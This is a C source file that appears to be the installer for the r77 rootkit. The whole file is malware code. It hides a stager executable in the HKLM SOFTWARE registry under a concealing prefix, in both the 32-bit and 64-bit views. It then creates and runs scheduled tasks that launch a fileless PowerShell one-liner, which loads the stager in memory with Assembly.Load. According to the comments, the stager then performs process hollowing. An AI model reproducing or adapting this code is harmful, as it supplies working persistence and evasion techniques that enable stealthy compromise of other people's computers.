#include "Install.h"

int CALLBACK WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow)
{
	InitializeApi(INITIALIZE_API_SRAND);

	// Get stager executable from resources.
	LPBYTE stager;
	DWORD stagerSize;
	if (!GetResource(IDR_INSTALLSTAGER, "EXE", &stager, &stagerSize)) return 0;

	// Write stager executable to registry.
	// This C# executable is compiled with AnyCPU and can be run by both 32-bit and 64-bit powershell.
	// The target framework is 3.5, but it will run, even if .NET 4.x is installed and .NET 3.5 isn't.
	// Because the powershell command may run using .NET 3.5, there is no access to a specific registry view.
	// Therefore, the executable needs to be written to both the 32-bit and the 64-bit registry view.

	HKEY key;
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE", 0, KEY_ALL_ACCESS | KEY_WOW64_32KEY, &key) != ERROR_SUCCESS ||
		RegSetValueExW(key, HIDE_PREFIX L"stager", 0, REG_BINARY, stager, stagerSize) != ERROR_SUCCESS) return 0;

	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE", 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &key) != ERROR_SUCCESS ||
		RegSetValueExW(key, HIDE_PREFIX L"stager", 0, REG_BINARY, stager, stagerSize) != ERROR_SUCCESS) return 0;

	// This powershell command loads the stager from the registry and executes it in memory using Assembly.Load().EntryPoint.Invoke()
	// The C# binary will proceed with creating a native process using process hollowing.
	// The powershell command is purely inline and doesn't require a ps1 file. However, the commandline may only be 260 characters (MAX_PATH).

	LPCWSTR powershellCommand =
		L"[Reflection.Assembly]::Load"
		L"("
		L"[Microsoft.Win32.Registry]::LocalMachine"
		L".OpenSubkey('SOFTWARE')"
		L".GetValue('" HIDE_PREFIX L"stager')"
		L")"
		L".EntryPoint"
		L".Invoke($Null,$Null)";

	// Create 32-bit scheduled task to run the powershell stager.
	DeleteScheduledTask(R77_SERVICE_NAME32);
	if (CreateScheduledTask(R77_SERVICE_NAME32, Is64BitOperatingSystem() ? L"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0" : L"", L"powershell", powershellCommand))
	{
		RunScheduledTask(R77_SERVICE_NAME32);
	}

	// Create 64-bit scheduled task to run the powershell stager.
	if (Is64BitOperatingSystem())
	{
		DeleteScheduledTask(R77_SERVICE_NAME64);
		if (CreateScheduledTask(R77_SERVICE_NAME64, L"", L"powershell", powershellCommand))
		{
			RunScheduledTask(R77_SERVICE_NAME64);
		}
	}

	return 0;
}